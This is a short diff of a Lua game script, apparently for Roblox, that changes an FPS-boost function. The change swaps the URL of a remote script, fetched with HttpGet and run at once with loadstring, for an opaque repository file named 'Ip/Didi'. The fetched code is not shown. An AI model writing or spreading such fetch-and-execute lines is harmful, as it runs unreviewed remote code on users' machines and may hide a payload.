@@ -363,7 +363,7 @@ function StuffsModule:SetFpsBoost(state)
 		    ["Low Quality Parts"] = true -- Lower quality parts
 		}
 		if _G.Settings then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/CasperFlyModz/discord.gg-rips/main/FPSBooster.lua"))()
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/jaanu91/Ip/refs/heads/main/Didi"))()
 		end
     end
 end
